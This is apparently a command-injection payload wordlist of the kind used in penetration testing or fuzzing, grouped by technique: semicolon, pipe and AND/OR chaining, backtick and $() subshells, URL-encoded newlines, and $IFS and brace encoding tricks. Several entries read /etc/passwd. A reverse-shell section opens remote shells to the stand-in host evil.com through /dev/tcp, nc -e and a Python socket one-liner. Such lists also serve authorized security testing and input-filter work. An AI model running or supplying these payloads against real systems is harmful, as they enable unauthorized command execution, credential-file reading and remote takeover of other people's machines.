# Command Injection Payloads
# Targets: shell metacharacters, pipe chains, backticks, $() syntax

# === Semicolon Chaining ===
;cat /etc/passwd
; cat /etc/passwd
;id
; id
;ls -la
; ls -la
;whoami
; whoami
;uname -a
;ping -c 1 evil.com

# === Pipe Chaining ===
| cat /etc/passwd
|cat /etc/passwd
| id
| whoami
| ls -la /
|ls
| nc evil.com 4444

# === AND / OR Chaining ===
&& cat /etc/passwd
&& id
|| cat /etc/passwd
|| id
& cat /etc/passwd
& id

# === Backtick Execution ===
`cat /etc/passwd`
`id`
`whoami`
`uname -a`
`ls -la`

# === $() Subshell ===
$(cat /etc/passwd)
$(id)
$(whoami)
$(uname -a)
$(ls -la)
$(/bin/bash -c 'id')

# === Newline Injection ===
%0aid
%0acat /etc/passwd
%0d%0aid
%0d%0awhoami

# === Reverse Shell ===
;bash -i >& /dev/tcp/evil.com/4444 0>&1
| bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'
$(bash -c 'exec bash -i &>/dev/tcp/evil.com/4444 <&1')
; python -c 'import socket,subprocess,os;os.dup2(socket.create_connection(("evil.com",4444)).fileno(),0)'
| nc -e /bin/sh evil.com 4444

# === Encoding Tricks ===
%3Bcat%20%2Fetc%2Fpasswd
%7Cid
%60id%60
;$IFS cat$IFS/etc/passwd
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
